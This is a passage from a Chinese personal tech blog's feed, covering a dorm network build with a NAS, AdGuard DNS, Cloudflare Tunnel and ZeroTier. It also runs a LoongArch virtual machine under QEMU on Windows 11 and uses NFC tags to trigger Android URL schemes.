src="https://cdn.lmark.cc/img/image-20230927105803080.png"></p><h2 id="校园网多拨"><a href="#校园网多拨" class="headerlink" title="校园网多拨"></a>校园网多拨</h2><p>校园网多拨是个好东西，因为🐏带校园网IPV4下行只有40M带宽，对于我们看4k油管，下载游戏来说也太慢了。这时候可以使用多拨。</p><p>原理也很简单，虚拟几张网卡，然后拨号，就可以了。OP固件提供了多拨功能，直接配置使用就好。</p><p>使用之后效果如下：</p><p><img src="https://cdn.lmark.cc/img/image-20230927112156805.png"></p><p>拨一个账号有40M带宽，拨六个账号就有240M带宽了。不过现在我已经不用多拨了，因为多拨时，IPV6地址支持不好，访问不了IPV6的地址。其实使用IPV6就有比较好的速度</p><p><img src="https://cdn.lmark.cc/img/image-20230927113023354.png"></p><p>使用clash走IPV6代理就可以加速steam下载了</p><h2 id="多设备存储-备份"><a href="#多设备存储-备份" class="headerlink" title="多设备存储&#x2F;备份"></a>多设备存储&#x2F;备份</h2><p>因为我有台式机，笔记本，Ipad，Linux主机，但是主要工作区是在台式机上，所以在别的设备上想要访问台式机文件就比较麻烦（比如交作业，查文件等）。之前的解决方案是使用坚果云，很好用，但是内存太小了，就算是专业版也只有40G内存，现在我已经使用了17个G了，而且还没备份旅游照片等大储存的东西。</p><p><img src="https://cdn.lmark.cc/img/image-20230927113705198.png"></p><p>所以，依托于NAS，可以使用同步软件——<strong>微力同步</strong>来同步文件到NAS上：</p><p><img src="https://cdn.lmark.cc/img/image-20230927114113952.png"></p><p>然后在把NAS的共享文件挂载到Alist上，这样就可以外网访问文件了。</p><p><img src="https://cdn.lmark.cc/img/image-20230927114611021.png"></p><h2 id="自建DNS-去广告"><a href="#自建DNS-去广告" class="headerlink" title="自建DNS+去广告"></a>自建DNS+去广告</h2><p>自建DNS其实对一般人来说没什么用，但是学校的DNS服务器老是抽风，经常打不开很多网站，而且还污染好多网站了，所以就考虑自己搭建一个。还能防止DNS泄露（也许？）</p><p>依托于adguardHome来搭建：</p><p><img src="https://cdn.lmark.cc/img/image-20230927115539945.png"></p><p>需要手动配置上游DNS服务器，这里用的是阿里和CF的DoH。列表如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://dns.alidns.com/dns-query</span><br><span class="line">https://doh.pub/dns-query</span><br><span class="line">https://223.6.6.6/dns-query</span><br><span class="line">https://1.0.0.1/dns-query</span><br><span class="line">https://dns10.quad9.net/dns-query</span><br></pre></td></tr></table></figure><p>然后策略使用的是“最快的IP地址”</p><p><img src="https://cdn.lmark.cc/img/image-20230927115911891.png"></p><p>BoostTrap服务器就根据自己的位置，选择离你最近的服务器就好，可以从这里面找<a href="https://dnsdaquan.com/">全国DNS服务器IP地址大全 公共DNS大全 dns地址大全 dns大全 (dnsdaquan.com)</a></p><p>另外在DNS缓存设置，可以设置大一点的缓存，毕竟很多域名IP不会经常变动。</p><p><img src="https://cdn.lmark.cc/img/image-20230927120433551.png"></p><p>同时使用“乐观缓存”来增加命中率</p><p>配置完之后就可以使用了，配置旁路由的DNS转发到adguardHome</p><p><img src="https://cdn.lmark.cc/img/image-20230927120616768.png"></p><p>去广告功能就是adguardHome的主要功能了，可以使用官方提供的的规则，或者使用自己的规则，这里提供两个我个人用的规则列表：</p><p><a href="https://anti-ad.net/adguard.txt">https://anti-ad.net/adguard.txt</a></p><p><a href="https://raw.githubusercontent.com/o0HalfLife0o/list/master/ad-pc.txt">https://raw.githubusercontent.com/o0HalfLife0o/list/master/ad-pc.txt</a></p><p><img src="https://cdn.lmark.cc/img/image-20230927134409045.png"></p><h2 id="全局爬墙"><a href="#全局爬墙" class="headerlink" title="全局爬墙"></a>全局爬墙</h2><p>这个东西懂得都懂，这是旁路由的一个比较重要的功能了，首先需要一个机场，这里我就不提供了，大家自己找找，我以前用的机场是4块钱一个月，两台设备，速度还行。后面换了个IPV6的机场，速度也是杠杠的。</p><p>我用的插件是PassWall 2，当然也可以使用openclash或者酸酸乳</p><p><img src="https://cdn.lmark.cc/img/image-20230927141419693.png"></p><p>依托于旁路由的强大性能，可以将国内外流量进行规则分流，这样比较体验会比较舒服些。</p><p>全局翻墙看油管4K是绰绰有余的，很适合给宿舍所有人用。</p><h2 id="公网访问内网网盘-图床-RSS阅读器"><a href="#公网访问内网网盘-图床-RSS阅读器" class="headerlink" title="公网访问内网网盘&#x2F;图床&#x2F;RSS阅读器"></a>公网访问内网网盘&#x2F;图床&#x2F;RSS阅读器</h2><p>之前使用云服务器时搭建了许多好玩和实用的服务，但是随着云服务器到期，很多服务都必须得迁移了。所以很多服务迁移到了群晖的docker里。但是内网服务外网一般访问不了，所以这时候可以实用cloudflare的Tunnel来打洞到公网。访问速度还挺快。</p><p><img src="https://cdn.lmark.cc/img/image-20230927144203157.png"></p><p>CF的Tunnel需要的东西：</p><ul><li>一个CF的账号</li><li>一个停靠在CF的域名</li><li>运行docker的环境</li></ul><p>具体教程上网搜索就有很多了，这里就不讲了，列举一些我用的有意思的服务：</p><h3 id="导航页"><a href="#导航页" class="headerlink" title="导航页"></a>导航页</h3><p><img src="https://cdn.lmark.cc/img/image-20230927144326333.png"></p><p>一个轻量化的书签导航页，实用</p><p>github：<a href="https://github.com/soulteary/docker-flare">soulteary&#x2F;docker-flare: Flare ✨ Lightweight, high performance and fast self-hosted navigation pages, resource utilization rate is &lt;1% CPU, MEM &lt;30 M, Docker Image &lt; 10M (github.com)</a></p><h3 id="Alist网盘"><a href="#Alist网盘" class="headerlink" title="Alist网盘"></a>Alist网盘</h3><p>一个把多个网盘整合起来的服务，支持多个网盘，也支持NAS挂载</p><p><img src="https://cdn.lmark.cc/img/image-20230928162252580.png"></p><p>链接：<a href="https://alist.nn.ci/">Home | AList Docs (nn.ci)</a></p><h3 id="蚁阅：RSS阅读器"><a href="#蚁阅：RSS阅读器" class="headerlink" title="蚁阅：RSS阅读器"></a>蚁阅：RSS阅读器</h3><p>一个非常简洁的web端RSS阅读器，支持自己搭建，官网也提供付费服务：</p><p><img src="https://cdn.lmark.cc/img/image-20230928164939160.png"></p><p>RSS阅读在如今信息爆炸的时代是很有用的，就是支持的网站有点少，建议搭配RSSHUB食用。</p><p>顺便推荐一些我用的RSS源：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> [<span class="string">🆕 科技新闻投稿📮TestFlight - Telegram Channel</span>](<span class="link">https://rsshub.rssforever.com/telegram/channel/TestFlightCN</span>)</span><br><span class="line"><span class="bullet">2.</span> [<span class="string">ahhhhfs｜A姐分享 - Telegram Channel</span>](<span class="link">https://rsshub.rssforever.com/telegram/channel/abskoop</span>)</span><br><span class="line"><span class="bullet">3.</span> [<span class="string">开源社区 - Telegram Channel</span>](<span class="link">https://rsshub.rssforever.com/telegram/channel/opencfdchannel</span>)</span><br><span class="line"><span class="bullet">4.</span> [<span class="string">江南一点雨</span>](<span class="link">http://www.javaboy.org/atom.xml</span>)</span><br><span class="line"><span class="bullet">5.</span> [<span class="string">云风的 BLOG</span>](<span class="link">https://blog.codingnow.com/atom.xml</span>)</span><br><span class="line"><span class="bullet">6.</span> [<span class="string">HCLonely Blog</span>](<span class="link">https://blog.hclonely.com/atom.xml</span>)</span><br><span class="line"><span class="bullet">7.</span> [<span class="string">ike&#x27;s Blog</span>](<span class="link">https://blog.ikeno.top/rss.xml</span>)</span><br><span class="line"><span class="bullet">8.</span> [<span class="string">Miigon&#x27;s blog</span>](<span class="link">https://blog.miigon.net/feed.xml</span>)</span><br><span class="line"><span class="bullet">9.</span> [<span class="string">王登科-DK博客</span>](<span class="link">https://greatdk.com/feed</span>)</span><br><span class="line"><span class="bullet">10.</span> [<span class="string">夏海比比</span>](<span class="link">https://huiweishijie.com/feed.xml</span>)</span><br><span class="line"><span class="bullet">11.</span> [<span class="string">Lei Zhang - lovchun.com</span>](<span class="link">https://lovchun.com/feed.xml</span>)</span><br><span class="line"><span class="bullet">12.</span> [<span class="string">熊猫不是猫QAQ</span>](<span class="link">https://panda995.xyz/feed/</span>)</span><br><span class="line"><span class="bullet">13.</span> [<span class="string">土木坛子</span>](<span class="link">https://tumutanzi.com/feed</span>)</span><br><span class="line"><span class="bullet">14.</span> [<span class="string">零度解說</span>](<span class="link">https://www.freedidi.com/feed</span>)</span><br><span class="line"><span class="bullet">15.</span> [<span class="string">四火的唠叨</span>](<span class="link">https://www.raychase.net/feed</span>)</span><br><span class="line"><span class="bullet">16.</span> [<span class="string">张鑫旭-鑫空间-鑫生活</span>](<span class="link">https://www.zhangxinxu.com/wordpress/feed/</span>)</span><br><span class="line"><span class="bullet">17.</span> [<span class="string">zyylee的博客</span>](<span class="link">https://www.zyylee.com/feeds/</span>)</span><br><span class="line"><span class="bullet">18.</span> [<span class="string">子舒的博客</span>](<span class="link">https://zburu.com/index.xml</span>)</span><br><span class="line"><span class="bullet">19.</span> [<span class="string">V2EX-最热主题</span>](<span class="link">https://rsshub.rssforever.com/v2ex/topics/hot</span>)</span><br><span class="line"><span class="bullet">20.</span> [<span class="string">少数派</span>](<span class="link">https://sspai.com/feed</span>)</span><br><span class="line"><span class="bullet">21.</span> [<span class="string">BIE 别的</span>](<span class="link">https://www.biede.com/feed/</span>)</span><br><span class="line"><span class="bullet">22.</span> [<span class="string">老高與小茉 Mr &amp; Mrs Gao - YouTube</span>](<span class="link">https://rsshub.rssforever.com/youtube/channel/UCMUnInmOkrWN4gof9KlhNmQ</span>)</span><br><span class="line"><span class="bullet">23.</span> [<span class="string">游研社-趣闻</span>](<span class="link">https://rss.shab.fun/yystv/category/news</span>)</span><br><span class="line"><span class="bullet">24.</span> [<span class="string">Epic Games Store - Free Games</span>](<span class="link">https://rsshub.rssforever.com/epicgames/freegames/zh_CN</span>)</span><br><span class="line"><span class="bullet">25.</span> [<span class="string">酷 壳 – CoolShell</span>](<span class="link">https://coolshell.cn/feed</span>)</span><br><span class="line"><span class="bullet">26.</span> [<span class="string">异次元软件世界</span>](<span class="link">https://feed.iplaysoft.com/</span>)</span><br><span class="line"><span class="bullet">27.</span> [<span class="string">小众软件</span>](<span class="link">https://feeds.appinn.com/appinns/</span>)</span><br><span class="line"><span class="bullet">28.</span> [<span class="string">HelloGitHub 月刊</span>](<span class="link">https://hellogithub.com/rss</span>)</span><br><span class="line"><span class="bullet">29.</span> [<span class="string">Linux 中国◆开源社区</span>](<span class="link">https://linux.cn/rss.xml</span>)</span><br><span class="line"><span class="bullet">30.</span> [<span class="string">w2solo - 独立开发者社区</span>](<span class="link">https://w2solo.com/topics/feed</span>)</span><br><span class="line"><span class="bullet">31.</span> [<span class="string">阮一峰的网络日志</span>](<span class="link">https://www.ruanyifeng.com/blog/atom.xml</span>)</span><br><span class="line"><span class="bullet">32.</span> [<span class="string">奇客Solidot–传递最新科技情报</span>](<span class="link">https://www.solidot.org/index.rss</span>)</span><br><span class="line"><span class="bullet">33.</span> [<span class="string">月光博客</span>](<span class="link">https://www.williamlong.info/rss.xml</span>)</span><br><span class="line"><span class="bullet">34.</span> [<span class="string">Monday Note - Medium</span>](<span class="link">https://mondaynote.com/feed</span>)</span><br></pre></td></tr></table></figure><p>链接：<a href="https://github.com/anyant/rssant">anyant&#x2F;rssant: 蚁阅 - 让 RSS 更好用，轻松订阅你喜欢的博客和资讯 (github.com)</a></p><h3 id="speedtest测速"><a href="#speedtest测速" class="headerlink" title="speedtest测速"></a>speedtest测速</h3><p>一个测速的小服务，还是在内网使用比较方便，打洞到外网的话速度就限制在CF的Tunnels上了，没什么参考价值。但是内网测速结构还是很快的。能跑到433M（理论小主机网卡的最高速度）<br><img src="https://cdn.lmark.cc/img/image-20230928170913657.png"></p><p>（远程桌面占用部分上行带宽和CPU导致数据偏低）</p><p>链接：<a href="https://github.com/librespeed/speedtest">librespeed&#x2F;speedtest: Self-hosted Speed Test for HTML5 and more. Easy setup, examples, configurable, mobile friendly. Supports PHP, Node, Multiple servers, and more (github.com)</a></p><h3 id="Memos网页共享备忘录"><a href="#Memos网页共享备忘录" class="headerlink" title="Memos网页共享备忘录"></a>Memos网页共享备忘录</h3><p>如何实现备忘录多端同步，最简单的方法就是使用web服务，这款Memos就是非常的轻量级，UI界面风格也很舒服。</p><p><img src="https://cdn.lmark.cc/img/image-20230928171241281.png"></p><p>特别是支持API接口服务，可以用在很多自动化脚本，或者一些自己的程序中来存备忘录</p><p>链接：<a href="https://github.com/usememos/memos">usememos&#x2F;memos: A privacy-first, lightweight note-taking service. Easily capture and share your great thoughts (github.com)</a></p><h3 id="文件快递柜"><a href="#文件快递柜" class="headerlink" title="文件快递柜"></a>文件快递柜</h3><p><img src="https://cdn.lmark.cc/img/image-20230928172129139.png"></p><p>一个轻量级免登录的文件中转站，适合自己的一些中转文件需求。界面很有意思，创意很不错</p><p>链接：<a href="https://github.com/vastsa/FileCodeBox">vastsa&#x2F;FileCodeBox: 文件快递柜-匿名口令分享文本，文件，像拿快递一样取文件（File Express Cabinet - Anonymous Passcode Sharing Text, Files, Like Taking Express Delivery for Files） (github.com)</a></p><h3 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h3><p>自建图床，速度取决于CF的Tunnel，但是用还是可以用的，可以给别人注册账号使用</p><p><img src="https://cdn.lmark.cc/img/image-20230928172441280.png"></p><p>链接：<a href="https://github.com/lsky-org/lsky-pro">lsky-org&#x2F;lsky-pro: ☁️兰空图床(Lsky Pro) - Your photo album on the cloud. (github.com)</a></p><h2 id="远程or语音操控开关空调-台灯-电脑"><a href="#远程or语音操控开关空调-台灯-电脑" class="headerlink" title="远程or语音操控开关空调&#x2F;台灯&#x2F;电脑"></a>远程or语音操控开关空调&#x2F;台灯&#x2F;电脑</h2><p>智能家居作为我宿舍网络另一个重要的部分，对于幸福度的提升有很大的帮助；可以说，适度正确地使用智能家居，享受科技的力量。智能家居中最重要的部分就是一个中枢网关，这里我是用便宜的小爱音箱Play来作为中枢网关。和小爱音箱比起来，play主打一个便宜。在宿舍一般就喊小爱同学开个空调开个灯啥的，特别方便。</p><p>有了中枢网关，接下来就是一些智能家居了，在宿舍这个场景，其实没有很多实用的小玩意，很多部件都是表面实用，实际上非常地冗余且没必要，这里我推荐几个我用的比较多的部件：</p><h3 id="米家温度收集器"><a href="#米家温度收集器" class="headerlink" title="米家温度收集器"></a>米家温度收集器</h3><p><img src="https://cdn.lmark.cc/img/image-20230928174134591.png"></p><p>米家墨水屏功能很简单，就是显示温度和湿度，而且还有个可爱的小表情（），可以实时监控宿舍的温度，让我们知冷暖，懂穿衣（bushi），而且还能搭配一些别的智能场景来使用（比如一定温度就开关空调啥的）</p><p>最大的缺点就是小贵，这块墨水屏太贵了。</p><h3 id="开机卡"><a href="#开机卡" class="headerlink" title="开机卡"></a>开机卡</h3><p>如果电脑能插网线的话，使用路由器的WOL唤醒其实就足够了，但是我的台式机不能插网线（位置不允许），所以就搞了块能接入米家的开机卡，这样直接用手机就能操控，再搭配上碰碰贴，可以实现手机碰一碰开机。关于碰碰贴使用可以见我以前的文章：<a href="https://lmark.cc/archives/decf5cc8.html">基于NFC的Url Scheme奇妙用法 | LMark的博客</a></p><p><img src="https://cdn.lmark.cc/img/image-20230928175330636.png"></p><h3 id="米家屏幕灯"><a href="#米家屏幕灯" class="headerlink" title="米家屏幕灯"></a>米家屏幕灯</h3><p>很出圈的屏幕灯，性价比比较高，特别是蓝牙旋钮还很帅，有需求可以入一个。貌似支持接入米家？</p><h3 id="米家云台摄像头"><a href="#米家云台摄像头" class="headerlink" title="米家云台摄像头"></a>米家云台摄像头</h3><p>这个东西我一直想买一个放宿舍来着，但是就是太贵了，而且实用性不强。如果有实时监控宿舍，或者想看看舍友在干嘛，可以考虑放一个在宿舍，配合宿舍NAS来使用，简直美滋滋。</p><h2 id="墨水屏实时监控宿舍电量"><a href="#墨水屏实时监控宿舍电量" class="headerlink" title="墨水屏实时监控宿舍电量"></a>墨水屏实时监控宿舍电量</h2><p>这就是一个好玩的东西了，纯原创（指卓衡giegie鼎力支持） </p><p>之前经常在12点的时候，空调断电，插座断电。一看才发现是宿舍电费用完了，然后到时间就给我们断电了。一开始的解决方法是跑一个脚本，每隔一会监测一下宿舍电量，如果低于阈值，就发邮件给每个舍友，提醒他们交电费。但是这种方法太不优雅了，然后突然看到米家温度计，有了灵感：为什么我不能做一个驱动板带一个墨水屏，并通过宿舍wifi爬取宿舍实时的电量呢？于是就找上了卓衡giegie来帮忙整了一个，最后成品效果很不错。</p><p><img src="https://cdn.lmark.cc/img/image-20230928180941348.png"></p><p>每隔十分钟刷新一次数据，通过wifi自动查询宿舍电量。</p><h2 id="安全的内网穿透访问"><a href="#安全的内网穿透访问" class="headerlink" title="安全的内网穿透访问"></a>安全的内网穿透访问</h2><p>宿舍内网开了这么多服务，那么多管理界面（主路由、旁路由、esxi等等）这些界面有外网访问的需求，但又不方便直接暴露在外网，所以需要一些安全的内网访问手段；并且设备很多，不同的设备又有不同的子网。这时候可以使用Zerotier来组一个内网穿透服务就很不错。</p><p>zerotier的速度是很有保证的，理论上打洞成功的话，就是p2p流量；即使不成功，也可以走官方节点或者Moon节点来传输流量。</p><p>我使用旁路由打开zerotier，并修改路由表，访问到内网众多服务了。</p><p><img src="https://cdn.lmark.cc/img/image-20230928181609781.png"></p><p>路由表</p><p><img src="https://cdn.lmark.cc/img/image-20230928182021175.png"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>宿舍网络也折腾了快一年了，自从搬来西海岸之后，就入手了个K2P，第一次组网，刷了各种各样的固件来玩，全局爬墙，去广，kmp都试过，后面发现k2p内存太小，经常用几个月就满了，然后进入只读模式。后面又买了台式机，路由器更加重要了，但是性能日益不足。后来，在刘某某的篡夺下，我入手了台J4125小主机，8G内存。又折腾了不少东西，什么esxi、旁路由、zerotier、NAS等。通过这些折腾，学到了不少东西吧，回过头来看，宿舍网络给我带来了好多的帮助和便利，同时也帮助其他一些同学实现了宿舍组网+远程桌面的使用。</p><p>但是人的精力是有限的，折腾了这么多之后，发现差不多能折腾的都折腾完了，实用性的东西也都有了，自己的需求也都满足了。自然就不想进取了。遂写下这篇总结，来记录一下这么久以来折腾宿舍网络的一些小成果，并供其他想要在宿舍组网的人参考参考。</p><p>累了，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      
        <title>win11下使用qemu运行Loongarch虚拟机</title>
      
      <link href="/archives/3f81eb3.html"/>
      <url>/archives/3f81eb3.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前打软件杯龙芯赛道，师姐让我们自己用qemu装loongnix体验一下比赛环境，但是当时一直忙就没装。现在又要编译一下loongarch的包了，交叉编译链搭起来好麻烦，遂想到了用qemu装loongarch虚拟机来玩玩。而且在8月份更新的8.1版本中对LA（代指loongarch，下同）更好了，更有理由装一个玩玩了。</p><h3 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h3><p>现在在windows下安装qemu已经很方便了，只需要在官网下载安装包：<a href="https://qemu.weilnetz.de/w64/2023/qemu-w64-setup-20230822.exe">qemu-w64-setup-20230822.exe</a></p><p><img src="https://cdn.lmark.cc/img/image-20230923004212907.png"></p><p>按照需要安装即可。</p><h3 id="下载loongnix镜像"><a href="#下载loongnix镜像" class="headerlink" title="下载loongnix镜像"></a>下载loongnix镜像</h3><p>这里我安装的是loongnix系统，当然LA也支持其他系统（如arch，debian12等）。根据需求安装。</p><p>镜像去官网下载：<a href="http://pkg.loongnix.cn/loongnix/isos/Loongnix-20.3/">Nginx Directory (loongnix.cn)</a></p><p>我下的是cartoon版的，带gui。并且是直接使用官方提供的qcow2虚拟盘格式，这样做的好处就是集成在一起，不用自己划盘，缺点就是比普通镜像稍微大点。当然这里使用普通iso镜像安装也是可以的。</p><p><img src="https://cdn.lmark.cc/img/image-20230923004818923.png"></p><h3 id="下载UEFI"><a href="#下载UEFI" class="headerlink" title="下载UEFI"></a>下载UEFI</h3><p>镜像启动需要引导程序，可以使用arch的引导程序<a href="https://mirrors.wsyu.edu.cn/loongarch/archlinux/images/">Index of &#x2F;loongarch&#x2F;archlinux&#x2F;images&#x2F; (wsyu.edu.cn)</a></p><p><img src="https://cdn.lmark.cc/img/image-20230923141457725.png"></p><p>这里下载8.0的引导程序<a href="https://mirrors.wsyu.edu.cn/loongarch/archlinux/images/QEMU_EFI_8.0.fd">QEMU_EFI_8.0.fd</a></p><h3 id="安装虚拟网卡"><a href="#安装虚拟网卡" class="headerlink" title="安装虚拟网卡"></a>安装虚拟网卡</h3><p>使用tap-windows创建一张虚拟网卡，官网：<a href="https://build.openvpn.net/downloads/releases/">Index of &#x2F;downloads&#x2F;releases&#x2F; (openvpn.net)</a></p><p>win11使用最新版本比较稳定，这个<code>tap-windows-9.24.7-I601-Win10</code>版本，之前使用9.23.1就会出现桥接之后虚拟机连不上网的情况，使用9.24.7完美解决。</p><p>下载地址:<a href="https://build.openvpn.net/downloads/releases/tap-windows-9.24.7-I601-Win10.exe">https://build.openvpn.net/downloads/releases/tap-windows-9.24.7-I601-Win10.exe</a></p><p><img src="https://cdn.lmark.cc/img/image-20230923010526910.png"></p><h4 id="配置虚拟网卡"><a href="#配置虚拟网卡" class="headerlink" title="配置虚拟网卡"></a>配置虚拟网卡</h4><p>安装好之后，<code>控制面板-&gt;网络和Internet-&gt;网络连接</code> 里面会多一张虚拟网卡，介绍里是Tap-windows什么的，选中之后按F2可以给它改名，随便改，以后要用</p><p><img src="https://cdn.lmark.cc/img/image-20230923011032434.png"></p><p>然后选中tap0和正在联网的网卡，用ctrl选中两个，然后右键使用<code>桥接</code>即可</p><h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><p>完事具备，就差启动虚拟机了，启动虚拟机的命令可以看UEFI文件下载地址里的README</p><p><img src="https://cdn.lmark.cc/img/image-20230923141955416.png"></p><p>我们要修改的是其中的fd引导程序路径、镜像的地址和qemu的路径</p><p>这里贴一下我的，启动代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\qemu\qemu-system-loongarch64.exe -m 8G -cpu la464-loongarch-cpu -M virt -smp 4 -bios E:\LA64\uefi\QEMU_EFI_8.0.fd -serial stdio -device virtio-gpu-pci -device nec-usb-xhci,id=xhci,addr=0x1b -device usb-tablet,id=tablet,bus=xhci.0,port=1 -device usb-kbd,id=keyboard,bus=xhci.0,port=2 -net nic,model=virtio -net tap,ifname=tap0 -net user,hostfwd=tcp::10021-:22 -hda E:\LA64\isos\Loongnix-20.3.sp1.cartoon.gui.loongarch64.cn.qcow2 --accel tcg,thread=multi</span><br></pre></td></tr></table></figure><p>其中，需要修改的地方是：</p><ul><li>D:\qemu\qemu-system-loongarch64.exe</li><li>E:\LA64\uefi\QEMU_EFI_8.0.fd</li><li>E:\LA64\isos\Loongnix-20.3.sp1.cartoon.gui.loongarch64.cn.qcow2</li></ul><p>在命令行输入之后，就需要漫长的等待了。进入GRUB界面后就能正常打开运行了，接下来就能进入登陆界面，如果是官方Loongnix系统，密码就是<strong>Loongson20</strong>，如果是arch密码就是<strong>loongarch</strong></p><p><img src="https://cdn.lmark.cc/img/image-20230924105226640.png"></p><h3 id="快捷启动脚本"><a href="#快捷启动脚本" class="headerlink" title="快捷启动脚本"></a>快捷启动脚本</h3><p>每次都手动输入这么长串指令还是很麻烦的，所以可以把指令写进bat文件里以后就可以一键打开了。</p><p><img src="https://cdn.lmark.cc/img/image-20230923144457899.png"></p><p>linux下可以放进bin里方便启动</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Loongarch </tag>
            
            <tag> qemu </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于NFC的Url Scheme奇妙用法</title>
      
      <link href="/archives/decf5cc8.html"/>
      <url>/archives/decf5cc8.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Url Scheme对于移动设备用户来说是十分方便的，可以在手机上快速打开应用，也可以实现应用间的互相调用；对于苹果用户，得益于快捷指令的强大，许多软件都支持各种各样的捷径来快速打开；而反观安卓这边，由于没有一个统一的要求，捷径这种东西在安卓上并不常见。一般都是软件内部自己在使用。但是安卓上的Url Scheme有许多有意思的东西，连苹果都做不到的一些功能，在这里记录一下。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>安卓没有类似苹果的捷径这样纯软件打开Url Scheme（貌似有，不过要root），所以需要一些NFC芯片来作为Trigger</p><p>这里用M1卡和NTAG21X都可以，能正常写入数据的就可以了，我推荐使用NTAG215轻薄款</p><p><img src="http://cdn.lmark.cc/img/image-20230723232048236.png"></p><p>很薄，可以到贴到纸的后面或者其他什么地方都可以。</p><p>其次，手机需要安装一个写入NFC数据的软件</p><p><img src="http://cdn.lmark.cc/img/image-20230723232309972.png"></p><p>最后，也是最重要的一点，准备一台有NFC功能的手机。</p><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>以下是个人觉得比较有用的一些Url Scheme应用，欢迎大佬在评论区补充些</p><h3 id="碰一碰连WIFI"><a href="#碰一碰连WIFI" class="headerlink" title="碰一碰连WIFI"></a>碰一碰连WIFI</h3><p>这个功能是最常见的，严格意义上来说这不属于Url Scheme的内容，因为里面数据是这样式的</p><p><img src="http://cdn.lmark.cc/img/image-20230726102613708.png"></p><p>这是用NFC Tools写入的数据，如果你是小米手机，使用米家app写入，就有些不一样</p><p><img src="http://cdn.lmark.cc/img/image-20230726102852681.png"></p><p>当然这个也不是正宗的Url Scheme，是打开米家自己进行的操作而已。</p><h3 id="碰一碰听歌（NFC音乐墙）"><a href="#碰一碰听歌（NFC音乐墙）" class="headerlink" title="碰一碰听歌（NFC音乐墙）"></a>碰一碰听歌（NFC音乐墙）</h3><p>这个在各大视频平台有很高的播放量，而且同一个Url Scheme安卓和苹果都能使用，网上比较多的教程是用网易云音乐的，当然其他音乐软件也行，我这里演示一下网易云的</p><p>往卡里写入如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orpheus://song/1365626644/?autoplay=1 </span><br></pre></td></tr></table></figure><p>其中<code>orpheus</code>是网易云音乐的包名，冒号后面的就是Url Scheme的路径了，中间的数字是想听的歌的id，后面的autoplay&#x3D;1是打开后自动播放的参数，可加可不加。</p><p>只要别人用有NFC的手机扫一扫，就能直接跳转到网易云的某一首歌的页面，如果在把歌曲的海报打印出来，那就可以实现现实与虚拟的交互了。</p><p>具体效果参考慢科技大佬的视频：<a href="https://b23.tv/xfyvsrQ">https://b23.tv/xfyvsrQ</a></p><h3 id="碰一碰打开取件码-蚂蚁森林"><a href="#碰一碰打开取件码-蚂蚁森林" class="headerlink" title="碰一碰打开取件码&#x2F;蚂蚁森林"></a>碰一碰打开取件码&#x2F;蚂蚁森林</h3><p>这个也是一个比较实用的功能，想象一下，每次去取快递，一只手拿着快递，一只手还要操作手机打开菜鸟，打开取件码，这是多麻烦的一件事，有了这个Url Scheme，我们可以写入手环里，需要的时候直接用手机碰一碰手环就能打开取件码了。</p><p>但是我找不到原贴了，因为是需要构造一定的参数，来打开淘宝取件码，所以比较复杂</p><p>还是来看看蚂蚁森林的Scheme吧，得益于支付宝的开放性，几乎每一个支付宝上的小程序都可以通过Scheme打开，以蚂蚁森林为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alipays://platformapi/startapp?appId=60000002</span><br></pre></td></tr></table></figure><p>其他的一些支付宝的Scheme如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 